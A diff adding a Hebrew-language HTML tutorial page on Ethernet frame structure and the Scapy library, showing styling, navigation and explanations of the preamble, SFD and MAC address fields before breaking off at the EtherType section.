@@ -1,0 +1,1927 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>פרוטוקול Ethernet + Scapy</title>
+<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;700;900&family=JetBrains+Mono:wght@300;400;500;700&family=Heebo:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:        #030810;
+  --bg2:       #060f1e;
+  --panel:     #0a1628;
+  --panel2:    #0e1f38;
+  --panel3:    #122440;
+  --border:    rgba(0,200,255,0.15);
+  --border2:   rgba(0,200,255,0.3);
+  --cyan:      #00d4ff;
+  --green:     #00ff88;
+  --orange:    #ff7b35;
+  --yellow:    #ffd600;
+  --pink:      #ff4f9b;
+  --purple:    #a855f7;
+  --red:       #ff4444;
+  --text:      #ddeeff;
+  --muted:     #5a7a9a;
+  --muted2:    #8aaabb;
+  --glow-c:    0 0 20px rgba(0,212,255,0.4);
+  --glow-g:    0 0 20px rgba(0,255,136,0.4);
+  --mono:      'JetBrains Mono', monospace;
+}
+
+/* ─── RESET & BASE ─── */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Rubik', 'Heebo', sans-serif;
+  overflow-x: hidden;
+  line-height: 1.6;
+}
+
+/* Scanline overlay */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    rgba(0,0,0,0.03) 0px,
+    rgba(0,0,0,0.03) 1px,
+    transparent 1px,
+    transparent 2px
+  );
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* ─── SCROLLBAR ─── */
+::-webkit-scrollbar { width: 6px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--panel3); border-radius: 3px; }
+::-webkit-scrollbar-thumb:hover { background: var(--cyan); }
+
+/* ─── TOPBAR ─── */
+.topbar {
+  position: fixed; top: 0; left: 0; right: 0;
+  height: 52px;
+  background: rgba(3,8,16,0.97);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 0 24px;
+  z-index: 500;
+  backdrop-filter: blur(20px);
+}
+.topbar-brand {
+  display: flex; align-items: center; gap: 12px;
+}
+.topbar-logo {
+  width: 32px; height: 32px;
+  background: linear-gradient(135deg, var(--cyan), var(--green));
+  border-radius: 6px;
+  display: flex; align-items: center; justify-content: center;
+  font-weight: 900; font-size: 16px; color: #000;
+  font-family: var(--mono);
+}
+.topbar-title {
+  font-family: var(--mono);
+  font-size: 16px;
+  color: var(--cyan);
+  letter-spacing: 1px;
+}
+.topbar-nav {
+  display: flex; gap: 4px;
+}
+.topbar-nav a {
+  font-family: var(--mono);
+  font-size: 16px;
+  color: var(--muted);
+  text-decoration: none;
+  padding: 5px 12px;
+  border-radius: 4px;
+  letter-spacing: 0.5px;
+  transition: all 0.2s;
+  border: 1px solid transparent;
+}
+.topbar-nav a:hover { color: var(--cyan); border-color: var(--border); }
+.topbar-nav a.active { color: var(--cyan); background: rgba(0,212,255,0.08); border-color: var(--border2); }
+
+/* ─── PROGRESS ─── */
+.progress-track {
+  position: fixed; top: 52px; left: 0; right: 0;
+  height: 2px; background: var(--panel2); z-index: 499;
+}
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--cyan), var(--green), var(--cyan));
+  background-size: 200% 100%;
+  animation: shimmer 3s linear infinite;
+  transition: width 0.3s;
+  box-shadow: 0 0 8px var(--cyan);
+}
+@keyframes shimmer { 0% { background-position: 0% 0%; } 100% { background-position: 200% 0%; } }
+
+/* ─── SIDEBAR ─── */
+.sidebar {
+  position: fixed; right: 0; top: 52px; bottom: 0;
+  width: 220px;
+  background: rgba(3,8,16,0.95);
+  border-left: 1px solid var(--border);
+  padding: 24px 0;
+  z-index: 400;
+  overflow-y: auto;
+}
+.sidebar-section {
+  padding: 0 16px;
+  margin-bottom: 24px;
+}
+.sidebar-label {
+  font-family: var(--mono);
+  font-size: 16px;
+  letter-spacing: 3px;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-bottom: 8px;
+  padding-right: 4px;
+}
+.sidebar-link {
+  display: flex; align-items: center; gap: 10px;
+  padding: 8px 12px;
+  border-radius: 6px;
+  text-decoration: none;
+  font-size: 16px;
+  color: var(--muted2);
+  transition: all 0.2s;
+  margin-bottom: 2px;
+  border: 1px solid transparent;
+  font-family: 'Rubik', sans-serif;
+}
+.sidebar-link:hover { color: var(--cyan); background: rgba(0,212,255,0.06); }
+.sidebar-link.active { color: var(--cyan); background: rgba(0,212,255,0.1); border-color: var(--border); }
+.sidebar-link .link-dot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--muted); flex-shrink: 0; transition: all 0.2s;
+}
+.sidebar-link.active .link-dot { background: var(--cyan); box-shadow: var(--glow-c); }
+.sidebar-link .link-badge {
+  margin-right: auto;
+  font-family: var(--mono);
+  font-size: 16px;
+  background: rgba(0,212,255,0.12);
+  color: var(--cyan);
+  padding: 1px 6px;
+  border-radius: 3px;
+}
+
+/* ─── MAIN CONTENT ─── */
+.main {
+  margin-top: 54px;
+  margin-right: 220px;
+  padding: 0;
+}
+
+/* ─── SECTIONS ─── */
+.section {
+  min-height: 100vh;
+  padding: 64px 56px;
+  border-bottom: 1px solid var(--border);
+  position: relative;
+}
+.section-hero {
+  background: radial-gradient(ellipse 70% 50% at 30% 50%, rgba(0,212,255,0.04) 0%, transparent 70%),
+              radial-gradient(ellipse 50% 60% at 80% 80%, rgba(0,255,136,0.03) 0%, transparent 60%);
+}
+
+/* ─── HERO ─── */
+.hero-eyebrow {
+  font-family: var(--mono);
+  font-size: 16px;
+  letter-spacing: 4px;
+  color: var(--cyan);
+  text-transform: uppercase;
+  margin-bottom: 20px;
+  display: flex; align-items: center; gap: 12px;
+}
+.hero-eyebrow::before {
+  content: '';
+  display: block;
+  width: 40px; height: 1px;
+  background: var(--cyan);
+}
+.hero-h1 {
+  font-size: clamp(3rem, 7vw, 6.5rem);
+  font-weight: 900;
+  line-height: 0.95;
+  margin-bottom: 24px;
+}
+.hero-h1 .line1 { display: block; color: var(--text); }
+.hero-h1 .line2 {
+  display: block;
+  background: linear-gradient(90deg, var(--cyan) 0%, var(--green) 100%);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-desc {
+  max-width: 600px;
+  color: var(--muted2);
+  font-size: 16px;
+  margin-bottom: 40px;
+  line-height: 1.8;
+}
+.hero-stats {
+  display: flex; gap: 40px; flex-wrap: wrap;
+  margin-top: 40px;
+  padding-top: 40px;
+  border-top: 1px solid var(--border);
+}
+.hero-stat-val {
+  font-family: var(--mono);
+  font-size: 2rem;
+  font-weight: 700;
+  color: var(--cyan);
+  display: block;
+  line-height: 1;
+}
+.hero-stat-lbl { font-size: 16px; color: var(--muted); margin-top: 4px; }
+
+/* ─── SECTION HEADERS ─── */
+.sec-header { margin-bottom: 40px; }
+.sec-tag {
+  display: inline-block;
+  font-family: var(--mono);
+  font-size: 16px;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  padding: 4px 12px;
+  border-radius: 3px;
+  margin-bottom: 12px;
+}
+.sec-tag-cyan { background: rgba(0,212,255,0.1); color: var(--cyan); border: 1px solid rgba(0,212,255,0.2); }
+.sec-tag-green { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid rgba(0,255,136,0.2); }
+.sec-tag-orange { background: rgba(255,123,53,0.1); color: var(--orange); border: 1px solid rgba(255,123,53,0.2); }
+.sec-tag-purple { background: rgba(168,85,247,0.1); color: var(--purple); border: 1px solid rgba(168,85,247,0.2); }
+.sec-h2 {
+  font-size: clamp(1.8rem, 3.5vw, 2.8rem);
+  font-weight: 800;
+  line-height: 1.1;
+  margin-bottom: 8px;
+}
+.sec-lead { color: var(--muted2); font-size: 16px; max-width: 700px; line-height: 1.7; }
+
+/* ─── FRAME BUILDER ─── */
+.frame-wrap {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 32px;
+  margin-bottom: 32px;
+}
+.frame-title {
+  font-family: var(--mono);
+  font-size: 16px;
+  letter-spacing: 3px;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-bottom: 20px;
+}
+.frame-row {
+  display: flex;
+  gap: 3px;
+  overflow-x: auto;
+  padding-bottom: 12px;
+}
+.frame-field {
+  border-radius: 6px;
+  padding: 0;
+  text-align: center;
+  flex-shrink: 0;
+  cursor: pointer;
+  transition: transform 0.2s, box-shadow 0.2s;
+  overflow: hidden;
+  border: 1px solid transparent;
+  min-height: 80px;
+  display: flex; flex-direction: column;
+}
+.frame-field:hover { transform: translateY(-6px); z-index: 10; }
+.frame-field.active { transform: translateY(-8px); z-index: 20; }
+.ff-header {
+  padding: 8px 6px 4px;
+  font-family: var(--mono);
+  font-weight: 700;
+  font-size: 16px;
+  letter-spacing: 0.5px;
+}
+.ff-size {
+  padding: 0 6px 8px;
+  font-size: 16px;
+  opacity: 0.75;
+  font-family: var(--mono);
+}
+
+/* Field colors */
+.ff-preamble  { background: rgba(90,100,140,0.2);  border-color: rgba(90,100,140,0.4);  }
+.ff-preamble  .ff-header { color: #8090bb; }
+.ff-dst       { background: rgba(255,75,75,0.15);   border-color: rgba(255,75,75,0.35);   }
+.ff-dst       .ff-header { color: var(--orange); }
+.ff-src       { background: rgba(0,212,255,0.12);   border-color: rgba(0,212,255,0.3);    }
+.ff-src       .ff-header { color: var(--cyan); }
+.ff-type      { background: rgba(255,214,0,0.12);   border-color: rgba(255,214,0,0.3);    }
+.ff-type      .ff-header { color: var(--yellow); }
+.ff-data      { background: rgba(0,255,136,0.1);    border-color: rgba(0,255,136,0.25);   }
+.ff-data      .ff-header { color: var(--green); }
+.ff-crc       { background: rgba(168,85,247,0.12);  border-color: rgba(168,85,247,0.3);   }
+.ff-crc       .ff-header { color: var(--purple); }
+
+.frame-field.active .ff-header { text-shadow: 0 0 8px currentColor; }
+
+/* Width map */
+.w-preamble { width: 90px; }
+.w-mac      { width: 110px; }
+.w-type     { width: 80px; }
+.w-data     { flex: 1; min-width: 180px; }
+.w-crc      { width: 80px; }
+
+/* Detail panel */
+.field-detail {
+  background: var(--panel2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 24px;
+  display: none;
+  animation: fadeDown 0.25s ease;
+}
+.field-detail.show { display: block; }
+@keyframes fadeDown {
+  from { opacity: 0; transform: translateY(-10px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+.fd-name {
+  font-family: var(--mono);
+  font-size: 16px;
+  font-weight: 700;
+  margin-bottom: 4px;
+}
+.fd-sub { color: var(--muted2); font-size: 16px; margin-bottom: 16px; }
+.fd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+.fd-block { }
+.fd-block-title {
+  font-family: var(--mono);
+  font-size: 16px;
+  letter-spacing: 2px;
+  color: var(--muted);
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+.fd-block-body { color: var(--muted2); font-size: 16px; line-height: 1.7; }
+.fd-block-body strong { color: var(--text); }
+.fd-example {
+  margin-top: 12px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px 16px;
+  font-family: var(--mono);
+  font-size: 16px;
+}
+.ex-label { font-size: 16px; letter-spacing: 2px; text-transform: uppercase; color: var(--muted); margin-bottom: 6px; }
+.ex-val { color: var(--cyan); }
+
+/* ─── CODE BLOCKS ─── */
+.code-wrap {
+  background: #010810;
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  overflow: hidden;
+  margin: 16px 0;
+}
+.code-header {
+  display: flex; align-items: center; justify-content: space-between;
+  background: var(--panel);
+  padding: 10px 16px;
+  border-bottom: 1px solid var(--border);
+}
+.code-dots { display: flex; gap: 6px; }
+.code-dots span {
+  width: 10px; height: 10px; border-radius: 50%;
+}
+.code-dots .d1 { background: var(--red); }
+.code-dots .d2 { background: var(--yellow); }
+.code-dots .d3 { background: var(--green); }
+.code-lang {
+  font-family: var(--mono);
+  font-size: 16px;
+  color: var(--muted);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+.copy-btn {
+  background: rgba(0,212,255,0.1);
+  border: 1px solid var(--border);
+  color: var(--cyan);
+  font-family: var(--mono);
+  font-size: 16px;
+  padding: 4px 12px;
+  border-radius: 4px;
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.copy-btn:hover { background: rgba(0,212,255,0.2); }
+.copy-btn.copied { color: var(--green); border-color: rgba(0,255,136,0.3); }
+pre {
+  padding: 20px;
+  overflow-x: auto;
+  font-family: var(--mono);
+  font-size: 16px;
+  line-height: 1.7;
+  tab-size: 4;
+  direction: ltr;
+}
+pre .cm  { color: #4a6080; }           /* comment */
+pre .kw  { color: #c792ea; }           /* keyword */
+pre .fn  { color: #82aaff; }           /* function */
+pre .str { color: #c3e88d; }           /* string */
+pre .num { color: var(--orange); }     /* number */
+pre .op  { color: var(--cyan); }       /* operator/builtin */
+pre .var { color: var(--text); }       /* variable */
+pre .mac { color: var(--yellow); }     /* mac address */
+pre .ip  { color: #f78c6c; }          /* ip */
+pre .hx  { color: #89ddff; }          /* hex */
+pre .out { color: var(--green); }      /* output */
+pre .err { color: var(--red); }        /* error */
+pre .pmt { color: var(--muted); }      /* prompt */
+
+/* ─── INFO CARDS ─── */
+.cards-grid { display: grid; gap: 16px; }
+.cg-2 { grid-template-columns: 1fr 1fr; }
+.cg-3 { grid-template-columns: 1fr 1fr 1fr; }
+.info-card {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 24px;
+  transition: all 0.25s;
+}
+.info-card:hover { border-color: var(--border2); transform: translateY(-2px); box-shadow: 0 8px 30px rgba(0,0,0,0.3); }
+.ic-icon { font-size: 1.8rem; margin-bottom: 12px; }
+.ic-title { font-family: var(--mono); font-size: 16px; font-weight: 700; margin-bottom: 8px; }
+.ic-body { color: var(--muted2); font-size: 16px; line-height: 1.7; }
+.ic-body strong { color: var(--text); }
+.ic-body code { font-family: var(--mono); background: rgba(0,212,255,0.1); color: var(--cyan); padding: 1px 6px; border-radius: 3px; font-size: 1.2em; }
+
+/* Border accent variants */
+.bc-cyan   { border-right: 3px solid var(--cyan); }
+.bc-green  { border-right: 3px solid var(--green); }
+.bc-orange { border-right: 3px solid var(--orange); }
+.bc-yellow { border-right: 3px solid var(--yellow); }
+.bc-purple { border-right: 3px solid var(--purple); }
+.bc-pink   { border-right: 3px solid var(--pink); }
+.bc-red    { border-right: 3px solid var(--red); }
+
+/* ─── ALERT / CALLOUT ─── */
+.callout {
+  border-radius: 8px;
+  padding: 16px 20px;
+  margin: 16px 0;
+  font-size: 16px;
+  line-height: 1.7;
+  display: flex; gap: 12px; align-items: flex-start;
+}
+.callout-icon { font-size: 16px; flex-shrink: 0; margin-top: 2px; }
+.callout-body strong { color: var(--text); }
+.callout-body { color: var(--muted2); }
+.ca-cyan   { background: rgba(0,212,255,0.06); border: 1px solid rgba(0,212,255,0.2); }
+.ca-orange { background: rgba(255,123,53,0.06); border: 1px solid rgba(255,123,53,0.2); }
+.ca-green  { background: rgba(0,255,136,0.06); border: 1px solid rgba(0,255,136,0.2); }
+.ca-red    { background: rgba(255,68,68,0.06);  border: 1px solid rgba(255,68,68,0.2); }
+
+/* ─── ETHERTYPE TABLE ─── */
+.etype-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 16px;
+  font-family: var(--mono);
+}
+.etype-table th {
+  background: var(--panel2);
+  padding: 12px 16px;
+  text-align: right;
+  font-size: 16px;
+  letter-spacing: 2px;
+  color: var(--muted);
+  text-transform: uppercase;
+  border-bottom: 2px solid var(--border2);
+}
+.etype-table td {
+  padding: 12px 16px;
+  border-bottom: 1px solid var(--border);
+  color: var(--muted2);
+}
+.etype-table tr:hover td { background: rgba(0,212,255,0.03); }
+.etype-table tr:last-child td { border-bottom: none; }
+.etype-val { color: var(--cyan); font-weight: 700; }
+.etype-proto { color: var(--text); }
+
+/* ─── SCAPY SECTION ─── */
+.scapy-logo {
+  font-family: var(--mono);
+  font-size: 3rem;
+  font-weight: 900;
+  background: linear-gradient(90deg, var(--green), var(--cyan));
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  background-clip: text;
+  line-height: 1;
+  margin-bottom: 8px;
+}
+.layer-pill {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 6px 14px;
+  border-radius: 20px;
+  font-family: var(--mono);
+  font-size: 16px;
+  font-weight: 700;
+  cursor: default;
+}
+.lp-eth    { background: rgba(0,212,255,0.15); color: var(--cyan); border: 1px solid rgba(0,212,255,0.3); }
+.lp-ip     { background: rgba(255,123,53,0.15); color: var(--orange); border: 1px solid rgba(255,123,53,0.3); }
+.lp-tcp    { background: rgba(0,255,136,0.12); color: var(--green); border: 1px solid rgba(0,255,136,0.25); }
+.lp-udp    { background: rgba(168,85,247,0.12); color: var(--purple); border: 1px solid rgba(168,85,247,0.25); }
+.lp-arp    { background: rgba(255,214,0,0.12); color: var(--yellow); border: 1px solid rgba(255,214,0,0.25); }
+.lp-icmp   { background: rgba(255,75,155,0.12); color: var(--pink); border: 1px solid rgba(255,75,155,0.25); }
+.lp-raw    { background: rgba(90,100,140,0.2); color: #8090bb; border: 1px solid rgba(90,100,140,0.3); }
+
+.slash-sep {
+  font-family: var(--mono);
+  color: var(--muted);
+  font-size: 1.4rem;
+  font-weight: 700;
+  padding: 0 4px;
+}
+
+.packet-builder {
+  display: flex; align-items: center; gap: 8px;
+  flex-wrap: wrap;
+  padding: 16px;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin: 12px 0;
+}
+
+/* ─── OUTPUT BLOCK ─── */
+.output-block {
+  background: #010508;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px 20px;
+  font-family: var(--mono);
+  font-size: 16px;
+  line-height: 1.9;
+  overflow-x: auto;
+  margin: 8px 0;
+}
+.ob-prompt { color: var(--muted); }
+.ob-result { color: var(--green); }
+.ob-field  { color: var(--cyan); }
+.ob-val    { color: var(--orange); }
+.ob-sep    { color: var(--muted); }
+
+/* ─── TABS ─── */
+.tabs-header {
+  display: flex; gap: 4px;
+  border-bottom: 1px solid var(--border);
+  margin-bottom: 24px;
+}
+.tab-btn {
+  background: none;
+  border: none;
+  padding: 10px 20px;
+  font-family: var(--mono);
+  font-size: 16px;
+  letter-spacing: 1px;
+  color: var(--muted);
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  margin-bottom: -1px;
+  transition: all 0.2s;
+  text-transform: uppercase;
+}
+.tab-btn:hover { color: var(--text); }
+.tab-btn.active { color: var(--cyan); border-bottom-color: var(--cyan); }
+.tab-pane { display: none; }
+.tab-pane.active { display: block; }
+
+/* ─── SNIFF TABLE ─── */
+.sniff-table { width: 100%; border-collapse: collapse; font-size: 16px; }
+.sniff-table th {
+  background: var(--panel2);
+  padding: 10px 14px;
+  text-align: right;
+  font-family: var(--mono);
+  font-size: 16px;
+  letter-spacing: 2px;
+  color: var(--muted);
+  text-transform: uppercase;
+  border-bottom: 1px solid var(--border2);
+}
+.sniff-table td {
+  padding: 9px 14px;
+  border-bottom: 1px solid var(--border);
+  font-family: var(--mono);
+  font-size: 16px;
+}
+.sniff-table tr:hover td { background: rgba(0,212,255,0.03); cursor: pointer; }
+.sniff-num { color: var(--muted); }
+.sniff-time { color: var(--muted2); }
+.sniff-mac-src { color: var(--cyan); }
+.sniff-mac-dst { color: var(--orange); }
+.sniff-proto { }
+.proto-ip   { color: var(--green); }
+.proto-arp  { color: var(--yellow); }
+.proto-ipv6 { color: var(--purple); }
+.sniff-len  { color: var(--muted2); }
+.sniff-info { color: var(--text); }
+
+/* ─── TWO COL ─── */
+.two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; }
+.three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 24px; }
+
+/* ─── ANIMATIONS ─── */
+.reveal { opacity: 0; transform: translateY(24px); transition: opacity 0.6s ease, transform 0.6s ease; }
+.reveal.visible { opacity: 1; transform: translateY(0); }
+
+/* ─── INLINE UTIL ─── */
+.mt8  { margin-top: 8px; }
+.mt16 { margin-top: 16px; }
+.mt24 { margin-top: 24px; }
+.mt32 { margin-top: 32px; }
+.mb16 { margin-bottom: 16px; }
+.mb24 { margin-bottom: 24px; }
+.gap-pills { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; margin: 12px 0; }
+hr.sec-divider { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+
+/* ─── MEDIA ─── */
+@media (max-width: 1100px) {
+  .sidebar { display: none; }
+  .main { margin-right: 0; }
+  .topbar-nav { display: none; }
+  .two-col, .cg-2, .cg-3, .three-col { grid-template-columns: 1fr; }
+  .section { padding: 48px 24px; }
+}
+</style>
+</head>
+<body>
+
+<!-- TOPBAR -->
+<div class="topbar">
+  <div class="topbar-brand">
+    <div class="topbar-logo">Ξ</div>
+    <div class="topbar-title">Ethernet Protocol &amp; Scapy</div>
+  </div>
+  <nav class="topbar-nav">
+    <a href="#sec-intro"   class="active" data-sec="sec-intro">מבנה</a>
+    <a href="#sec-fields"  data-sec="sec-fields">שדות</a>
+    <a href="#sec-etype"   data-sec="sec-etype">EtherType</a>
+    <a href="#sec-scapy"   data-sec="sec-scapy">Scapy</a>
+    <a href="#sec-sniff"   data-sec="sec-sniff">Sniffing</a>
+    <a href="#sec-craft"   data-sec="sec-craft">Crafting</a>
+  </nav>
+</div>
+
+<!-- PROGRESS -->
+<div class="progress-track"><div class="progress-fill" id="prog" style="width:0%"></div></div>
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+  <div class="sidebar-section">
+    <div class="sidebar-label">// מבנה</div>
+    <a href="#sec-intro"  class="sidebar-link active" data-sec="sec-intro"><span class="link-dot"></span>מבוא ל-Ethernet</a>
+    <a href="#sec-fields" class="sidebar-link" data-sec="sec-fields"><span class="link-dot"></span>שדות המסגרת</a>
+    <a href="#sec-etype"  class="sidebar-link" data-sec="sec-etype"><span class="link-dot"></span>EtherType <span class="link-badge">טבלה</span></a>
+  </div>
+  <div class="sidebar-section">
+    <div class="sidebar-label">// Scapy</div>
+    <a href="#sec-scapy" class="sidebar-link" data-sec="sec-scapy"><span class="link-dot"></span>מבוא ל-Scapy</a>
+    <a href="#sec-sniff" class="sidebar-link" data-sec="sec-sniff"><span class="link-dot"></span>Sniffing תנועה</a>
+    <a href="#sec-craft" class="sidebar-link" data-sec="sec-craft"><span class="link-dot"></span>Crafting מסגרות</a>
+  </div>
+</aside>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<main class="main">
+
+<!-- ─── SEC 1: INTRO ─── -->
+<section class="section section-hero" id="sec-intro">
+  <div class="hero-eyebrow">פרוטוקול שכבת הקו — IEEE 802.3</div>
+  <h1 class="hero-h1">
+    <span class="line1">פרוטוקול</span>
+    <span class="line2">Ethernet</span>
+  </h1>
+  <p class="hero-desc">
+    פרוטוקול Ethernet הוא הפרוטוקול הנפוץ ביותר בשכבת הקו (Data Link Layer).
+    הוא מגדיר כיצד נתונים ממוסגרים ומועברים בין שתי ישויות הקשורות ישירות ברשת קווית.
+    כל דבר שעובר על הרשת — HTTP, DNS, ARP — עטוף בתוך מסגרת Ethernet.
+  </p>
+
+  <div class="hero-stats reveal">
+    <div>
+      <span class="hero-stat-val">802.3</span>
+      <div class="hero-stat-lbl">תקן IEEE</div>
+    </div>
+    <div>
+      <span class="hero-stat-val">1500</span>
+      <div class="hero-stat-lbl">bytes מקסימום payload (MTU)</div>
+    </div>
+    <div>
+      <span class="hero-stat-val">6</span>
+      <div class="hero-stat-lbl">bytes לכל כתובת MAC</div>
+    </div>
+    <div>
+      <span class="hero-stat-val">64–1518</span>
+      <div class="hero-stat-lbl">bytes גודל מסגרת</div>
+    </div>
+  </div>
+
+  <hr class="sec-divider">
+
+  <!-- INTERACTIVE FRAME -->
+  <div class="reveal mt32">
+    <div class="frame-wrap">
+      <div class="frame-title">// מסגרת ethernet — לחץ על שדה לפרטים</div>
+      <div class="frame-row">
+        <div class="frame-field ff-preamble w-preamble" onclick="showField('preamble')">
+          <div class="ff-header">Preamble<br>+ SFD</div>
+          <div class="ff-size">8 bytes</div>
+        </div>
+        <div class="frame-field ff-dst w-mac" onclick="showField('dst')">
+          <div class="ff-header">Destination<br>MAC</div>
+          <div class="ff-size">6 bytes</div>
+        </div>
+        <div class="frame-field ff-src w-mac" onclick="showField('src')">
+          <div class="ff-header">Source<br>MAC</div>
+          <div class="ff-size">6 bytes</div>
+        </div>
+        <div class="frame-field ff-type w-type" onclick="showField('type')">
+          <div class="ff-header">Ether<br>Type</div>
+          <div class="ff-size">2 bytes</div>
+        </div>
+        <div class="frame-field ff-data w-data" onclick="showField('data')">
+          <div class="ff-header">Data / Payload</div>
+          <div class="ff-size">46–1500 bytes</div>
+        </div>
+        <div class="frame-field ff-crc w-crc" onclick="showField('crc')">
+          <div class="ff-header">CRC /<br>FCS</div>
+          <div class="ff-size">4 bytes</div>
+        </div>
+      </div>
+
+      <div id="field-detail" class="field-detail mt16"></div>
+    </div>
+  </div>
+
+  <div class="callout ca-cyan reveal">
+    <div class="callout-icon">💡</div>
+    <div class="callout-body">
+      <strong>הרעיון המרכזי:</strong> שכבת הקו עוטפת את החבילה מהשכבות הגבוהות יותר (IP, TCP, HTTP...)
+      בתוך מסגרת עם כתובות MAC כדי שתוכל לעבור בין שתי ישויות סמוכות על אותו תווך פיזי.
+    </div>
+  </div>
+</section>
+
+<!-- ─── SEC 2: FIELDS IN DEPTH ─── -->
+<section class="section" id="sec-fields">
+  <div class="sec-header">
+    <div class="sec-tag sec-tag-cyan">// שדות המסגרת</div>
+    <h2 class="sec-h2">כל שדה — בעומק</h2>
+    <p class="sec-lead">נסביר כל שדה במסגרת Ethernet, מהו, מה גודלו, ומה ניתן ללמוד ממנו בזמן ניתוח תנועה.</p>
+  </div>
+
+  <!-- PREAMBLE -->
+  <div class="reveal mb24">
+    <div class="info-card bc-cyan">
+      <div class="two-col" style="gap:24px; align-items:start">
+        <div>
+          <div class="ic-icon">⏱</div>
+          <div class="ic-title" style="color:var(--cyan); font-size: 16px;">Preamble + SFD — 8 בתים</div>
+          <div class="ic-body mt8">
+            ה-Preamble מורכב מ-<strong>7 בתים</strong> של הרצף <code>10101010</code> (0xAA) שנועד <strong>לסנכרן את הצדדים</strong> — הנמען מבין שמסגרת חדשה עומדת להתחיל.<br><br>
+            ה-<strong>SFD (Start Frame Delimiter)</strong> הוא הבית ה-8 בדיוק — הערך <code>10101011</code> (0xAB) — ומסמן את תחילת המסגרת בפועל.
+          </div>
+        </div>
+        <div>
+          <div class="fd-example">
+            <div class="ex-label">// ערך ה-Preamble</div>
+            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="hx">AA AA AA AA AA AA AA</span>  <span class="cm">← 7 bytes preamble</span>
+<span class="hx">AB</span>                      <span class="cm">← SFD (1 byte)</span></pre>
+          </div>
+          <div class="callout ca-orange mt8" style="font-size: 16px;">
+            <div class="callout-icon">⚠️</div>
+            <div class="callout-body"><strong>שים לב:</strong> Wireshark ו-Scapy בדרך כלל <strong>לא מציגים</strong> את ה-Preamble — הוא מוסר ע"י ה-NIC לפני שהנתון מגיע לתוכנה.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAC FIELDS -->
+  <div class="reveal mb24">
+    <div class="info-card bc-orange">
+      <div class="ic-title" style="color:var(--orange); font-size: 16px; margin-bottom:16px;">🎯 Destination MAC + Source MAC — 6 בתים כל אחד</div>
+      <div class="two-col" style="gap:24px;">
+        <div>
+          <div class="ic-body">
+            כתובת MAC (Media Access Control) היא <strong>48 ביט</strong> — 6 בתים הכתובים בהקסדצימלי:
+            <br><br>
+            <strong>3 בתים ראשונים (OUI):</strong> מזהה יצרן (Organizationally Unique Identifier)<br>
+            <strong>3 בתים אחרונים (NIC):</strong> ייחודי לכרטיס הרשת הספציפי
+          </div>
+          <div class="fd-example mt8">
+            <div class="ex-label">// מבנה MAC</div>
+            <pre style="padding:0; margin-top:6px; font-size: 16px; background:none;"><span class="mac">d8:bb:c1</span><span class="op">:</span><span class="cyan">7a:3f:2e</span>
+<span class="cm">└─ OUI ─┘ └─ NIC ─┘</span>
+<span class="cm">  (Apple)   (ייחודי)</span></pre>
+          </div>
+        </div>
+        <div>
+          <div class="ic-body">
+            <strong>כתובות מיוחדות:</strong>
+          </div>
+          <div style="margin-top:10px; display:flex; flex-direction:column; gap:8px;">
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// Broadcast (לכולם)</div>
+              <span class="mac">FF:FF:FF:FF:FF:FF</span>
+            </div>
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// Multicast (לקבוצה)</div>
+              <span class="mac">01:00:5E:xx:xx:xx</span>
+            </div>
+            <div class="fd-example" style="margin:0;">
+              <div class="ex-label">// Null (לא בשימוש)</div>
+              <span class="mac">00:00:00:00:00:00</span>
+            </div>
+          </div>
+          <div class="callout ca-green mt8" style="font-size: 16px;">
+            <div class="callout-icon">🔐</div>
+            <div class="callout-body"><strong>סייבר:</strong> ניתן לזייף MAC (MAC Spoofing) בתוכנה — לכן MAC לבדה <strong>אינה מנגנון אבטחה</strong>!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- TYPE -->
+  <div class="reveal mb24">
+    <div class="info-card bc-yellow">
+      <div class="two-col" style="gap:24px;">
+        <div>
+          <div class="ic-icon">🏷️</div>
